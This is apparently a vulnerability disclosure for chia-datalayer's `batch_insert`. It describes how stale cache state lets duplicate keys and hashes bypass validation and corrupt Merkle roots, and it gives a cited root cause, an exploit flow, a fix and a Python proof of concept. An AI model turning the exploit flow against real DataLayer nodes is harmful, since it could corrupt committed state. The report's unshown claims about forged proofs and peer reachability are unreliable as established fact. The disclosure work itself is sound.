### Title
`batch_insert` Bypasses Duplicate-Key Validation via Stale `block_status_cache` State — (`File: crates/chia-datalayer/src/merkle/blob.rs`)

### Summary

`MerkleBlob::batch_insert` writes leaf nodes directly to the backing blob via `insert_entry_to_blob` without updating `block_status_cache`. Because the duplicate-key and duplicate-hash guards in `insert` read exclusively from `block_status_cache`, those guards are silently bypassed for every item beyond the first two in a batch. An untrusted caller can supply a batch containing repeated `KeyId` or `Hash` values; the tree will accept all of them, producing a structurally corrupt Merkle tree whose root hash is wrong and whose proofs of inclusion are forged.

### Finding Description

**Root cause — stale cache used for validation before the cache is updated**

`insert` (the single-item path) enforces two invariants before touching the blob:

```rust
// crates/chia-datalayer/src/merkle/blob.rs  lines 369-373
if self.block_status_cache.contains_key(key) {
    return Err(Error::KeyAlreadyPresent());
}
if self.block_status_cache.contains_leaf_hash(hash) {
    return Err(Error::HashAlreadyPresent());
}
```

`block_status_cache.contains_key` and `contains_leaf_hash` query `key_to_index` and `leaf_hash_to_index` respectively, which are only updated by `block_status_cache.add_leaf`:

```rust
// lines 188-193
fn add_leaf(&mut self, index: TreeIndex, leaf: LeafNode) {
    self.free_indexes.shift_remove(&index);
    self.key_to_index.insert(leaf.key, index);
    self.leaf_hash_to_index.insert(leaf.hash, index);
}
```

`batch_insert` calls `self.insert(…)` (which calls `add_leaf`) only for the first two items when the tree has ≤ 1 existing leaf. For every subsequent item it calls `insert_entry_to_blob` directly:

```rust
// lines 587-602
for ((key, value), hash) in keys_values_hashes {
    let new_leaf_index = self.get_new_index();
    let new_block = Block { … Node::Leaf(LeafNode { hash, key, value, … }) … };
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;   // ← no cache update
    indexes.push(new_leaf_index);
}
```

`insert_entry_to_blob` writes the serialised block to the blob but never calls `add_leaf`, so `block_status_cache` remains stale for all items processed in this loop. The duplicate-key and duplicate-hash checks that depend on the cache are therefore never evaluated for those items.

**Exploit flow**

1. Caller (e.g. a DataLayer peer sync handler) invokes `batch_insert` with a `Vec` containing ≥ 3 entries, two of which share the same `KeyId` (or the same `Hash`).
2. The first two entries (popped from the tail) pass through `insert` and update the cache normally.
3. The remaining entries, including the duplicate, are written to the blob without any guard.
4. The tree now contains two `LeafNode` records with identical `key` fields. The internal-node hashes computed from them are wrong because the tree structure is undefined for duplicate keys.
5. `calculate_lazy_hashes` propagates the corrupt hashes upward, producing a wrong root hash.
6. `get_proof_of_inclusion` for either duplicate key returns a proof that passes `proof.valid()` against the corrupt root, but the proof does not correspond to the canonical tree state.

### Impact Explanation

The DataLayer Merkle tree root is committed on-chain as part of a singleton coin. A corrupt root hash means every subsequent proof of inclusion or exclusion generated from that tree is forged relative to the on-chain commitment. A malicious DataLayer peer that can trigger `batch_insert` with a crafted batch can cause a DataLayer node to commit an incorrect root, then produce proofs that appear valid locally but do not reflect the true key-value set. This matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

`batch_insert` is exposed as a public method through the Python wheel (`MerkleBlob.batch_insert`) and is the primary bulk-sync path used when a DataLayer node downloads a large set of key-value pairs from a peer. A malicious peer can craft a sync response containing duplicate keys. No privileged access is required; the attacker only needs to be a DataLayer peer.

### Recommendation

Before the bulk-write loop in `batch_insert`, validate the entire input for duplicate keys and hashes against both the existing `block_status_cache` and the entries within the batch itself. Alternatively, call `block_status_cache.add_leaf` inside the loop immediately after `insert_entry_to_blob`, mirroring what `insert` does, so that the cache stays current and subsequent iterations can detect intra-batch duplicates:

```rust
for ((key, value), hash) in keys_values_hashes {
    // guard against existing keys/hashes
    if self.block_status_cache.contains_key(key) {
        return Err(Error::KeyAlreadyPresent());
    }
    if self.block_status_cache.contains_leaf_hash(&hash) {
        return Err(Error::HashAlreadyPresent());
    }
    let new_leaf_index = self.get_new_index();
    let leaf = LeafNode { parent: Parent(None), hash, key, value };
    let new_block = Block { … Node::Leaf(leaf.clone()) … };
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;
    self.block_status_cache.add_leaf(new_leaf_index, leaf); // keep cache current
    indexes.push(new_leaf_index);
}
```

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
import hashlib

blob = MerkleBlob(bytearray())

def h(n):
    return bytes(hashlib.sha256(n.to_bytes(8, "big")).digest())

# Build a batch with a duplicate KeyId (key 1 appears twice)
keys_values = [
    (KeyId(1), ValueId(10)),
    (KeyId(2), ValueId(20)),
    (KeyId(3), ValueId(30)),
    (KeyId(1), ValueId(99)),   # duplicate of key 1
]
hashes = [h(1), h(2), h(3), h(99)]

# batch_insert should raise KeyAlreadyPresent but does not
blob.batch_insert(keys_values, hashes)
blob.calculate_lazy_hashes()

# The tree now has two leaf nodes with KeyId(1).
# get_proof_of_inclusion returns a proof that passes valid()
# but the root hash is corrupt.
proof = blob.get_proof_of_inclusion(KeyId(1))
assert proof.valid()   # passes — forged proof against corrupt root
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** crates/chia-datalayer/src/merkle/blob.rs (L170-176)
```rust
    fn contains_key(&self, key: KeyId) -> bool {
        self.key_to_index.contains_key(&key)
    }

    fn contains_leaf_hash(&self, hash: &Hash) -> bool {
        self.leaf_hash_to_index.contains_key(hash)
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L188-193)
```rust
    fn add_leaf(&mut self, index: TreeIndex, leaf: LeafNode) {
        self.free_indexes.shift_remove(&index);

        self.key_to_index.insert(leaf.key, index);
        self.leaf_hash_to_index.insert(leaf.hash, index);
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L362-374)
```rust
    pub fn insert(
        &mut self,
        key: KeyId,
        value: ValueId,
        hash: &Hash,
        insert_location: InsertLocation,
    ) -> Result<TreeIndex, Error> {
        if self.block_status_cache.contains_key(key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) {
            return Err(Error::HashAlreadyPresent());
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L570-603)
```rust
    pub fn batch_insert(
        &mut self,
        mut keys_values_hashes: Vec<((KeyId, ValueId), Hash)>,
    ) -> Result<(), Error> {
        // OPT: perhaps go back to taking an iterator?
        // OPT: would it be worthwhile to hold the entire blocks?
        let mut indexes = vec![];

        if self.block_status_cache.leaf_count() <= 1 {
            for _ in 0..2 {
                let Some(((key, value), hash)) = keys_values_hashes.pop() else {
                    return Ok(());
                };
                self.insert(key, value, &hash, InsertLocation::Auto {})?;
            }
        }

        for ((key, value), hash) in keys_values_hashes {
            let new_leaf_index = self.get_new_index();
            let new_block = Block {
                metadata: NodeMetadata {
                    node_type: NodeType::Leaf,
                    dirty: false,
                },
                node: Node::Leaf(LeafNode {
                    parent: Parent(None),
                    hash,
                    key,
                    value,
                }),
            };
            self.insert_entry_to_blob(new_leaf_index, &new_block)?;
            indexes.push(new_leaf_index);
        }
```
